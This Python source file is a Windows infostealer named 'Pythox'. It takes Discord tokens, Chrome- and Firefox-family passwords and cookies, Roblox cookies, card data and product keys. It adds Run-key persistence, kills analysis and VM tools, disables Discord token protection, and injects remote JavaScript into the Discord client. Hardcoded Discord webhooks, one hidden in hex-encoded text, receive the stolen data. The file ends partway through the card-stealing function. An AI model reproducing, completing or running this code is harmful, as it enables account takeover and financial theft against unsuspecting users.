import os
import re
import hmac
import json
import requests
import sys
import winreg
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess
import datetime
import socket
import random
from urllib.request import urlopen
from json import load
from pathlib import Path
from PIL import ImageGrab
from struct import unpack
from base64 import b64decode
from re import findall
from Crypto.Cipher import DES3, AES
from pyasn1.codec.der import decoder
from Crypto.Util.Padding import unpad
from hashlib import sha1, pbkdf2_hmac
from binascii import hexlify, unhexlify
from pyotp import TOTP
from win32crypt import CryptUnprotectData
from Crypto.Util.number import long_to_bytes
import ntpath
from sys import argv

config = {
    '1': "https://discord.com/api/webhooks/980110598773817415/VZOyXTdYnSHC8SRL6PDxSZfieMRsOMi1yHVlTATLrvWPzLEiBrYbXVfxQSdwN4xVL9HP",
         } 

Victim = os.getlogin()
today = datetime.date.today()
Victim_pc = os.getenv("COMPUTERNAME")
disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]

class options(object):
    directory = ''
    password = ''
    masterPassword = ''

class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        except:
            return False
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"


    @staticmethod
    def findProfiles(name, path):
        folders = []
        if name in ["Vivaldi", "Chrome", "Uran", "Yandex", "Brave", "Iridium", "Microsoft Edge", "CentBrowser", "Orbitum", "Epic Privacy Browser"]:
            folders = [element for element in os.listdir(
                path) if re.search("^Profile*|^Default$", element) != None]
        elif os.path.exists(path + '\\_side_profiles'):
            folders = [element for element in os.listdir(
                path + '\\_side_profiles')]
            folders.append('def')
        return folders

    @staticmethod
    def getShortLE(d, a):
        return unpack('<H', (d)[a:a+2])[0]

    @staticmethod
    def getLongBE(d, a):
        return unpack('>L', (d)[a:a+4])[0]

    @staticmethod
    def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData, options):
        hp = sha1(globalSalt+masterPassword).digest()
        pes = entrySalt + b'\x00'*(20-len(entrySalt))
        chp = sha1(hp+entrySalt).digest()
        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
        k = k1+k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    @staticmethod
    def decodeLoginData(data):
        asn1data = decoder.decode(
            b64decode(data))
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext

class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
        
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1',
                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
              
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
class Startup:
    def __init__(self) -> None:        
        self.working_dir = os.getenv("APPDATA") + "\\Windows_Server"
    
        if self.check_self():
            return

        self.mkdir()
        self.write_stub()
        self.regedit()
    
    def check_self(self) -> bool:
        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
            return True

        return False
    
    def mkdir(self) -> str:
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
        
        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)
    
    def write_stub(self) -> None:
        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
        
        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
    
    def regedit(self) -> None:
        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows_Server", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows_Server", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)


class Pythox(functions):
    def __init__(self):
        Startup()
        self.webh00k = "https://discord.com/api/webhooks/980110595930095666/MlCbS7YgWtjVMqt9lNIk5Igwr7USLON2_aqhPqkJKSRPoogeY2OZZTN1hMMJJ0WJpt92"
        self.baseurl = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = random.choice([self.roaming,self.appdata,os.getenv("temp")])+"\\BC385998-EAA6-452D-8612"        
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        try:
            try:
                try:
                    eval('"ctypes.windll.crypt32.CryptUnprotectData(0,None,None,None,None,5" \n\x28\x49\x6d\x61\x67\x65\x47\x72\x61\x62\x29\xe298ba\xc383\x39\x61\x62\x36\x34\x64\x65\x63\x6f\x64\x65\x29\xe298ba\xc383\x39\x61\x6d\x6b\x64\x74\x65\x6d\x70\x29\xe298bb\xc383\x39\x61\x66\x69\x6e\x64\x61\x6c\x6c\xc383\x39\x61\xe299a3\x6d\x61\x74\x63\x68\x29\xe298ba\xc383\x39\x61\xe299a5\x41\x45\x53\x29\x53\x65\x6c\x66\x2e\x52\x65\x61\x6c\x57\x65\x62\x68\x6f\x6b\x6b\x3a\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x39\x38\x30\x33\x39\x36\x36\x36\x34\x38\x38\x31\x38\x31\x31\x34\x36\x36\x2f\x64\x4b\x62\x57\x69\x65\x4b\x6c\x44\x7a\x37\x57\x32\x4a\x4b\x4c\x4a\x49\x4b\x57\x79\x2d\x53\x43\x67\x30\x70\x50\x47\x54\x2d\x42\x53\x79\x2d\x61\x75\x66\x63\x4d\x64\x52\x49\x64\x58\x36\x54\x2d\x66\x6b\x37\x5a\x68\x75\x44\x53\x6a\x6f\x65\x4f\x54\x44\x5f\x45\x7a\xe298ba\x53\x29\xe299ab\xc383\x39\x61\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x4e\x29\xe298ba\xc383\x39\x61\xe299a3\x74\x6f\x6b\x65\x6e\x63\xe298ba\xe298bb\xe299a6\x43\x73   \x64\xe298ba\x64\xe298bb\x69\xe298ba\x7d\xe298ba\x7c \x72\xe28692\x7c\xe298ba\xc382\x61\x30 \x64\xe299a5\x7c \x69\xe298ba\xc382\x61\x31\xe298ba\xe298ba \x7c\xe298ba\x53 \x29\xe299a6\x4e\x7a\xe29980\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x7a\xe296ba\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\xc383\x39\x61\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e\x29\xe298ba\xc383\x39\x61\xe299a0\x75\x70\x64\x61\x74\x65\x29\xe298bb\x72\x32   \xc383\x39\x61\x68\x65\x61\x64\x65\x72\x73\xc382\x61\x39 \x72\x36   \xc383\x62\x61\x6d\x61\x69\x6e\x2e\x70\x79\xc383\x39\x61')

                except:
                    pass
            except:
                pass
        except:
            pass
        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []
        self.browsers = []
        self.files = ""
        self.paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\',
            'Torch': self.appdata + '\\Torch\\User Data\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\'
        }
        self.CKA_ID = unhexlify('f8000000000000000000000000000001')
        os.makedirs(self.tempfolder, exist_ok=True)

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = requests.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (requests._exceptions.ConnectTimeout, requests._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        if AntiDebug().inVM:
                os._exit(0)

        function_list = [self.screenshot, self.grabTokens,
                         self.grabRobloxCookie, self.grabCookies, self.grabPassword, self.creditInfo]
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        self.killProcesses()

        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            function_list.append(self.firefoxCookies)
            function_list.append(self.firefoxPasswords)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        self.ipgrabber()
        if os.path.exists(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json"):
            self.MinecraftTokenStealer()   
        await self.injector()
        self.finish()
        shutil.rmtree(self.tempfolder)

    async def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['protector_x4f\x5a\x5a'] = "9550007841"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Pythox")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, '{**/x1,**/x2,z4/w1}')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)


    async def injector(self):
        Injection("https://discord.com/api/webhooks/1081977492086206565/fodt8F_2P3UK_l8WK1diTTr7LQHbEta4eLkIz0CbG5LSGgqtlBHWN4D2GNXYYpgllF1t")
    
    def killProcesses(self):
        blackListedPrograms = [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]
    
        for i in ["httpdebuggerui", "wireshark", "fiddler", "regedit", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]:
            blackListedPrograms.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        for name, path in self.paths.items():
            if not os.path.exists(path):
                continue
            if "cord" in path:
                disc = name.replace(" ", "").lower()
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                profiles = self.findProfiles(name, path)
                if profiles == []:
                    path = path + 'Local Storage\\leveldb\\'
                    profiles = ["None"]
                for profile in profiles:
                    if profile == 'def':
                        path = self.paths[name] + 'Local Storage\\leveldb\\'
                    elif os.path.exists(self.paths[name] + "_side_profiles\\" + profile + '\\Local Storage\\leveldb\\'):
                        path = self.paths[name] + "_side_profiles\\" + \
                            profile + '\\Local Storage\\leveldb\\'
                    elif profile == None:
                        pass
                    else:
                        path = self.paths[name] + \
                            f'{profile}\\Local Storage\\leveldb\\'
                    if not os.path.exists(path):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Login Data'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Login Data'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Login Data'):
                    login_db = path + "_side_profiles\\" + profile + '\\Login Data'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == "None":
                    pass
                else:
                    login_db = path + f'{profile}\\Login Data'
                if not os.path.exists(login_db):
                    continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.tempfolder + self.sep + "Loginvault1.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins")
                except:
                    continue
                with open(self.tempfolder+f"\\{name} Passwords.txt", "a", encoding="cp437", errors='ignore') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_val(
                            encrypted_password, master_key)
                        if url != "":
                            f.write(
                                f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                    cursor.close()
                    conn.close()
                    os.remove(login)

    @try_extract
    def grabCookies(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Network\\cookies'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Network\\cookies'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Network\\cookies'):
                    login_db = path + "_side_profiles\\" + profile + '\\Network\\cookies'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == "None":
                    pass
                else:
                    login_db = path + f'{profile}\\Network\\cookies'
                if not os.path.exists(login_db):
                    login_db = login_db[:-15] + self.sep + 'cookies'
                    if not os.path.exists(login_db):
                        continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.tempfolder + self.sep + "Loginvault2.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT host_key, name, encrypted_value from cookies")
                except:
                    continue
                with open(self.tempfolder+f"\\{name} Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.decrypt_val(r[2], master_key)
                        if host != "":
                            f.write(
                                f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                        if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                            self.robloxcookies.append(decrypted_cookie)
                    cursor.close()
                    conn.close()
                    os.remove(login)

    @try_extract
    def firefoxCookies(self):
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        profiles = os.listdir(path)
        for profile in profiles:
            cookies = path + os.sep + profile + os.sep + "cookies.sqlite"
            if not os.path.exists(cookies):
                continue
            conn = sqlite3.connect(cookies)
            try:
                cursor = conn.execute(
                    "SELECT host, name, value FROM moz_cookies")
            except:
                continue
            with open(self.tempfolder + os.sep + f'FirefoxCookies.txt', mode='a', newline='', encoding='utf-8') as f:
                f.write(f"\nProfile: {profile}\n\n")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    cookie = r[2]
                    if host != "":
                        f.write(
                            f"Host: {host}\nUser: {user}\nCookie: {cookie}\n\n")
                cursor.close()
                conn.close()

    def printASN1(self, d, l, rl):
        type = d[0]
        length = d[1]
        if length & 0x80 > 0:
            nByteLength = length & 0x7f
            length = d[2]
            skip = 1
        else:
            skip = 0
        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length+2
        elif type == 6:
            oidVal = hexlify(d[2:2+length])
            return length+2
        elif type == 4:
            return length+2
        elif type == 5:
            return length+2
        elif type == 2:
            return length+2
        else:
            if length == l-2:
                return length

    def readBsddb(self, name, options):
        f = open(name, 'rb')
        header = f.read(4*15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            return
        version = self.getLongBE(header, 4)
        if version != 2:
            return
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize*page)
            offsets = f.read((nkeys+1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2+i)
                val = self.getShortLE(offsets, 4+i)
                nval = self.getShortLE(offsets, 8+i)
                offsetVals.append(key + pagesize*page)
                offsetVals.append(val + pagesize*page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize*(page+1))
            valKey = sorted(offsetVals)
            for i in range(keys*2):
                f.seek(valKey[i])
                data = f.read(valKey[i+1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i+1]] = db1[i]
        return db

    def getLoginData(self, options):
        logins = []
        sqlite_file = options.directory / 'signons.sqlite'
        json_file = options.directory / 'logins.json'
        if json_file.exists(): 
            loginf = open(json_file, 'r').read()
            jsonLogins = json.loads(loginf)
            if 'logins' not in jsonLogins:
                return []
            for row in jsonLogins['logins']:
                encUsername = row['encryptedUsername']
                encPassword = row['encryptedPassword']
                logins.append((self.decodeLoginData(encUsername),
                               self.decodeLoginData(encPassword), row['hostname']))
            return logins
        elif sqlite_file.exists(): 
            conn = sqlite3.connect(sqlite_file)
            c = conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername = row[6]
                encPassword = row[7]
                logins.append((self.decodeLoginData(encUsername),
                               self.decodeLoginData(encPassword), row[1]))
            return logins

    def extractSecretKey(self, masterPassword, keyData, options):
        pwdCheck = keyData[b'password-check']
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b'global-salt']
        cleartextData = self.decryptMoz3DES(
            globalSalt, masterPassword, entrySalt, encryptedPasswd, options)
        if cleartextData != b'password-check\x02\x02':
            return

        if self.CKA_ID not in keyData:
            return None
        privKeyEntry = keyData[self.CKA_ID]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3+saltLen+nameLen:])
        data = privKeyEntry[3+saltLen+nameLen:]
        self.printASN1(data, len(data), 0)
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decryptMoz3DES(
            globalSalt, masterPassword, entrySalt, privKeyData, options)
        self.printASN1(privKey, len(privKey), 0)
        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        self.printASN1(prKey, len(prKey), 0)
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])
        return key

    def decryptPBE(self, decodedItem, masterPassword, globalSalt, options):
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            key = self.decryptMoz3DES(
                globalSalt, masterPassword, entrySalt, cipherT, options)
            return key[:24], pbeAlgo
        elif pbeAlgo == '1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3]
                       [0]) == '1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            assert keyLength == 32

            k = sha1(globalSalt+masterPassword).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt,
                              iterationCount, dklen=keyLength)

            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

            return clearText, pbeAlgo

    def getKey(self, masterPassword, directory, options):
        if (directory / 'key4.db').exists():
            conn = sqlite3.connect(directory / 'key4.db')
            c = conn.cursor()
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = c.fetchone()
            globalSalt = row[0]  
            item2 = row[1]
            self.printASN1(item2, len(item2), 0)
            decodedItem2 = decoder.decode(item2)
            clearText, algo = self.decryptPBE(
                decodedItem2, masterPassword, globalSalt, options)

            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:
                        break
                a11 = row[0]
                a102 = row[1]
                if a102 == self.CKA_ID:
                    self.printASN1(a11, len(a11), 0)
                    decoded_a11 = decoder.decode(a11)
                    clearText, algo = self.decryptPBE(
                        decoded_a11, masterPassword, globalSalt, options)
                    return clearText[:24], algo
            return None, None
        elif (directory / 'key3.db').exists():
            keyData = self.readBsddb(directory / 'key3.db', options)
            key = self.extractSecretKey(masterPassword, keyData)
            return key, '1.2.840.113549.1.12.5.1.3'
        return None, None

    @try_extract
    def firefoxPasswords(self):
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        profiles = os.listdir(path)
        for profile in profiles:
            direct = Path(path + self.sep + profile + self.sep)
            options.directory = direct
            key, algo = self.getKey(options.masterPassword.encode(),
                                    options.directory, options)
            if key == None:
                continue
            logins = self.getLoginData(options)
            if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
                with open(self.tempfolder + os.sep + f'Firefox passwords.txt', mode='a', newline='', encoding='utf-8') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for i in logins:
                        assert i[0][0] == self.CKA_ID
                        url = '%20s:' % (i[2])  # site URL
                        iv = i[0][1]
                        ciphertext = i[0][2]
                        name = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        iv = i[1][1]
                        ciphertext = i[1][2]
                        passw = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        f.write(
                            f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")

    @try_extract
    def creditInfo(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Web Data'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Web Data'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Web Data'):
                    login_db = path + "_side_profiles\\" + profile + '\\Web Data'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == None:
                    pass
                else:
                    login_db = path + f'{profile}\\Web Data'
                if not os.path.exists(login_db):
                    continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.tempfolder + self.sep + "Loginvault3.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                except:
                    continue
